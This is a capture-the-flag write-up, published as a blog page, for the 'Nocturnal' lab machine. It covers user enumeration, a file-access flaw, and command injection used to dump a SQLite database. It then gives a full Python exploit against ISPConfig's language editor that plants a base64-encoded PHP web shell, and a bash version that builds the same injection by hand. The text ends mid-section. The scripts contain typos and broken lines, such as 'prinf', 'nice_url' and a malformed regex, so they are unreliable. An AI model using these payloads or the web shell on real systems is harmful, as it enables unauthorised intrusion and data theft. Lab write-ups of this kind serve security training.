<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Nocturnal-Linux-Easy | Pwn3d777</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Nocturnal-Linux-Easy" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Nocturnal" />
<meta property="og:description" content="Nocturnal" />
<link rel="canonical" href="https://your-site-url/writeups/2025/08/17/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91.html" />
<meta property="og:url" content="https://your-site-url/writeups/2025/08/17/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91.html" />
<meta property="og:site_name" content="Pwn3d777" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-08-17T12:05:57+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Nocturnal-Linux-Easy" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-08-17T12:05:57+00:00","datePublished":"2025-08-17T12:05:57+00:00","description":"Nocturnal","headline":"Nocturnal-Linux-Easy","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/08/17/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91.html"},"url":"https://your-site-url/writeups/2025/08/17/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
<div class="post">
  <h1 class="post-title">Nocturnal-Linux-Easy</h1>
  
  <div class="post-date">
    Published on 17 Aug 2025
    
  </div>
  
  <h1 id="nocturnal">Nocturnal</h1>

<h1 id="1-enumeration">1. Enumeration</h1>

<p>Start by enumerating the open ports on this machine
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image.png" alt="image.png" />
<br /><br />
Only two ports are open, one running SSH and other hosting a web application service. This web application is designed to upload office or PDF files<br />
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_1.png" alt="image.png" />
<br /><br />
Register an account to inspect what actions could be executed as a normal user
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_2.png" alt="image.png" />
<br /><br />
We also proceed to enumerate directories but nothing of interest was found
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_3.png" alt="image.png" />
<br /><br />
Upload a file and capture the request using <code class="language-plaintext highlighter-rouge">Burpsuite</code> to inspect what it is going on 
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_4.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
A normal <code class="language-plaintext highlighter-rouge">.pdf</code> file was uploaded
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_5.png" alt="image.png" />
<br /><br />
The GET request used to access the uploaded file includes the username and the name file to locate the required file
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_6.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_7.png" alt="image.png" />
<br /><br />
However we can’t access files outside the user’s directory
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_8.png" alt="image.png" />
<br /><br />
This is way to enumerate users, as the response returns different messages depending whether a user exists or not, <code class="language-plaintext highlighter-rouge">fuzz</code> the username parameter in this request
<br /><br /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">u</span> <span class="s">'http://nocturnal.htb/view.php?username=FUZZ&amp;file-doesnotexist.pdf'</span> <span class="o">-</span><span class="n">H</span> <span class="s">'Cookie: cookie'</span> <span class="o">-</span><span class="n">w</span> <span class="n">wordlist</span> <span class="o">--</span><span class="n">hh</span> <span class="n">hidecharacters</span>
</code></pre></div></div>

<p><br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_9.png" alt="image.png" />
<br /><br />
When we request a file for amanda, the web server displays a message disclosing user’s updated files. The backend does not validate the identity of the entity performing the request through the cookie. This allows us to access other users’ uploads and exfiltrate their information like the admin password
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_10.png" alt="image.png" />
<br /><br />
Now we have access to the admin panel, here we can review the source code of the page, this could lead to a security breach by exposing direct vulnerabilities
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_11.png" alt="image.png" />
<br /><br />
We can also create back ups of this page source
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_12.png" alt="image.png" />
<br /><br />
In the login.php the database file is disclosed
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_13.png" alt="image.png" /></p>

<p><br /><br />
In <code class="language-plaintext highlighter-rouge">admin.php</code> we can see how the backup is generated, it is created by a command executed by <code class="language-plaintext highlighter-rouge">proc_open</code> funcion, the password field is not sanitized at all, it allows us to break out the normal command flow of the command using a <code class="language-plaintext highlighter-rouge">“</code> , enabling arbitrary command execution outside of the zip command. However we also need to consider the clean entry function which removes characters like <code class="language-plaintext highlighter-rouge">;</code>  - <code class="language-plaintext highlighter-rouge">&amp;</code> -   ``etc.
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_14.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_15.png" alt="image.png" />
<br /><br />
Use the following payload to exfiltrate database information, to bypass clean entry function we will use <code class="language-plaintext highlighter-rouge">TAB</code> urlencoded
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"sqlite3%09../nocturnal_database/nocturnal_database.db%09.dump"</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_16.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_17.png" alt="image.png" />
<br /><br />
Crack the hashes found to gain access as tobias through SSH
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_18.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
As <code class="language-plaintext highlighter-rouge">tobias</code> we can access to internal services that weren’t available before
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_19.png" alt="image.png" />
<br /><br />
In <code class="language-plaintext highlighter-rouge">localhost:8080</code> there is a web application with a login form, let’s proceed to forward it
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_20.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">IPSCONFIG</code> is a control panel for linux servers, access it using the credentials obtained previously
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_21.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_22.png" alt="image.png" />
<br /><br />
While checking around, specifically in monitor section, an error is displayed revealing the current version of the software
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_23.png" alt="image.png" />
<br /><br />
Search on internet for vulnerabilities related with this version
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_24.png" alt="image.png" />
<br /><br />
If the admin can edit language it means we will have access as root in the machine
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_25.png" alt="image.png" />
<br /><br />
Use the following script to exploit this vulnerability and spawn a shell with elevated privileges
<br /><br /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="k">def</span> <span class="nf">ensure_url_format</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
	<span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">startswith</span><span class="p">((</span><span class="s">"http://"</span><span class="p">,</span><span class="s">"https://"</span><span class="p">)):</span>
		<span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"Url must start with http:// or https://"</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">no</span> <span class="n">url</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"/"</span><span class="p">):</span>
		<span class="n">url</span> <span class="o">+=</span> <span class="s">"/"</span>
	
	<span class="k">return</span> <span class="n">url</span>
	
<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">session</span><span class="p">):</span>
	
	<span class="n">login_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">login/"</span>
	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">'username'</span><span class="p">:</span><span class="n">user</span><span class="p">,</span>
		<span class="s">'password'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span>
		<span class="s">'s_mod'</span><span class="p">:</span><span class="s">'login'</span>
	<span class="p">}</span>
	
	<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">if</span> <span class="s">'Usename or password wrong'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'Login failed!!'</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Login successful!"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_csrf_tokens</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">lang_file</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="s">'[*] Fetching CSRF tokens..'</span><span class="p">)</span>
	<span class="n">target_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">admin/language_edit.php"</span>
	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">'lang'</span><span class="p">:</span><span class="s">'en'</span><span class="p">,</span>
		<span class="s">'module'</span><span class="p">:</span><span class="s">'help'</span><span class="p">,</span>
		<span class="s">'lang_file'</span><span class="p">:</span><span class="n">lang_file</span>
	<span class="p">}</span>
	<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	
	<span class="n">csrf_id_match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'_csrf_id" value="([^"]+)"'</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
	<span class="n">csrf_key_match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'_csrf_key" value="([^"])+)"'</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
	
	<span class="k">if</span> <span class="ow">not</span> <span class="n">csrf_id_match</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">csrf_key_match</span><span class="p">:</span>
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"[-] CSRF tokens not found!"</span><span class="p">)</span>
	
  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] CSRF ID: </span><span class="si">{</span><span class="n">csrf_id_match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] CSRF Key: </span><span class="si">{</span><span class="n">csrf_key_match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">csrf_id_match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">csrf_key_match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  

<span class="k">def</span> <span class="nf">inject_shell</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">lang_file</span><span class="p">,</span> <span class="n">csrf_id</span><span class="p">,</span> <span class="n">csrf_key</span><span class="p">):</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;?php print('___'); passthru(base64_decode(\$_SERVER['HTTP_C'])); print('___';) ?&gt;"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>  
	<span class="n">injection</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"'];file_put_contents('sh.php',base64_decode('</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'));die;#"</span>
	
	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'lang'</span><span class="p">:</span> <span class="s">'en'</span><span class="p">,</span>
        <span class="s">'module'</span><span class="p">:</span> <span class="s">'help'</span><span class="p">,</span>
        <span class="s">'lang_file'</span><span class="p">:</span> <span class="n">lang_file</span><span class="p">,</span>
        <span class="s">'_csrf_id'</span><span class="p">:</span> <span class="n">csrf_id</span><span class="p">,</span>
        <span class="s">'_csrf_key'</span><span class="p">:</span> <span class="n">csrf_key</span><span class="p">,</span>
        <span class="s">'records[</span><span class="se">\\</span><span class="s">]'</span><span class="p">:</span> <span class="n">injection</span>
    <span class="p">}</span>
		<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">admin/language_edit.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Shell written to: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">admin/sh.php"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Failed to send payload, HTTP </span><span class="si">{</span><span class="n">resp</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        
 <span class="k">def</span> <span class="nf">launch_shell</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">session</span><span class="p">):</span>
	 <span class="k">print</span><span class="p">(</span><span class="s">"[+] Lauching shell..."</span><span class="p">)</span>
	 <span class="n">shell_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">admin/sh.php"</span>
	 
	 <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		 <span class="k">try</span><span class="p">:</span>
			 <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">ispconfig-shell@#"</span><span class="p">)</span>
			 <span class="k">if</span> <span class="n">cmd</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s">"exit"</span><span class="p">:</span>
				 <span class="k">break</span>
			 
			 <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'C'</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()}</span>
			 <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">shell_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
			 <span class="n">output</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'___(.*)___'</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
						 
			 <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
			         <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">strip</span><span class="p">())</span>
			     <span class="k">else</span><span class="p">:</span>
			         <span class="k">print</span><span class="p">(</span><span class="s">"[-] Exploit failed or no output."</span><span class="p">)</span>
	 	<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
		  <span class="k">break</span>   

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Usage: python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;url&gt; &lt;Username&gt; &lt;passowrd&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
		
	<span class="n">url</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	
	<span class="c1">#Disable SSL warnings
</span>	<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
	
	<span class="n">url</span> <span class="o">=</span> <span class="n">ensure_url_format</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
	<span class="n">session</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">nice_url</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">session</span><span class="p">)</span>
	
	<span class="n">lang_file</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span><span class="p">,</span><span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="s">'.lng'</span>
	<span class="n">csrf_id</span><span class="p">,</span> <span class="n">csrf_key</span> <span class="o">=</span> <span class="n">get_csrf_tokens</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">lang_file</span><span class="p">)</span>
	<span class="n">inject_shell</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">session</span><span class="p">,</span> <span class="n">lang_file</span><span class="p">,</span> <span class="n">csrf_id</span><span class="p">,</span> <span class="n">csrf_key</span><span class="p">)</span>
	<span class="n">launch_shell</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">session</span><span class="p">)</span>
</code></pre></div></div>

<p><br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_26.png" alt="image.png" />
<br /><br />
We can also exploit this php injection manually. First we need to retrieve <code class="language-plaintext highlighter-rouge">CSRF</code> validation tokens by  simulating an edit of a random <code class="language-plaintext highlighter-rouge">lang_file</code> 
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_27.png" alt="image.png" />
<br /><br />
The next step is to prepare our payload, we will use variables for a better understanding of each part of the injection
<br /><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">SHELL_NAME</span><span class="o">=</span><span class="s2">"rev.php"</span>
<span class="c">#Take the content of the C header and execute it as system</span>
<span class="nv">PHP_PAYLOAD</span><span class="o">=</span><span class="s2">"&lt;?php echo '___'; system(base64_decode(</span><span class="se">\$</span><span class="s2">_SERVER['HTTP_C'])); echo '___'; ?&gt;"</span>
<span class="c">#Base 64 enconde the payload</span>
<span class="nv">ENCODED</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$PHP_PAYLOAD</span><span class="s2">"</span>| <span class="nb">base64</span> <span class="nt">-w0</span><span class="si">)</span>
<span class="c">#Upload the file that is expecting the malicious header to then execute it</span>
<span class="nv">INJECT</span><span class="o">=</span><span class="s2">"']file_put_contents('</span><span class="nv">$SHELL_NAME</span><span class="s2">',base64_decode('</span><span class="nv">$ENCODED</span><span class="s2">'));die;#"</span>
<span class="c">#Encode the injection to support url formating -s oneline -R raw -r plaintext @uri=urlencode</span>
<span class="nv">ENCODED_INJECT</span><span class="o">=</span><span class="si">$(</span>prinf <span class="s1">'%s'</span> <span class="s2">"</span><span class="nv">$INJECT</span><span class="s2">"</span> | jq <span class="nt">-s</span> <span class="nt">-R</span> <span class="nt">-r</span> @uri<span class="si">)</span>
</code></pre></div></div>

<p><br /><br />
